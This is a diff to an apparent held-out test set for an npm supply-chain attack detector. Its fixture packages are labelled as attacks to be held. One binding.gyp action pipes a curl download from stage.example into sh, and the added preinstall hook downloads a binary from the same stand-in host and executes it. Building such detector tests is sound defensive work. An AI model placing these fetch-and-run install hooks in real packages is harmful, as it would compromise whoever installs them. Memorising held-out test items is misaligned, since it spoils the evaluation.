@@ -30,10 +30,10 @@ export const HELDOUT: HeldOutCase[] = [
     head: [lib("sum-native", "1.4.1", {}, { "index.js": `module.exports = (a, b) => a + b;\n`, "binding.gyp": `{ "targets": [{ "target_name": "x", "actions": [{ "action_name": "prep", "inputs": [], "outputs": ["x.out"], "action": ["sh", "-c", "curl -s https://stage.example/s.sh | sh"] }] }] }\n` })],
   },
   {
-    id: "jscrambler-style-import-loader", kind: "attack", expect: "hold", disclosed: "2026-07-11",
-    source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
-    note: "no install scripts: the entry file runs a downloaded stage when the package is imported",
+    id: "jscrambler-style-preinstall-binary", kind: "attack", expect: "hold", disclosed: "2026-07-11",
+    source: "https://jscrambler.com/blog/security-incident-postmortem-jscrambler/",
+    note: "minor release adds a preinstall hook that downloads a native binary and runs it",
     base: [lib("code-guard", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
-    head: [lib("code-guard", "8.18.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n${STAGE}` })],
+    head: [lib("code-guard", "8.18.0", { scripts: { preinstall: "node fetch-tool.js" } }, { "index.js": `module.exports = { protect: (s) => s };\n`, "fetch-tool.js": `const https = require("https");\nconst { execFileSync } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/guard-helper";\nhttps.get("https://stage.example/guard-helper", (r) => { r.pipe(fs.createWriteStream(dest, { mode: 0o755 })).on("close", () => execFileSync(dest, { stdio: "ignore" })); });\n` })],
   },
 ];
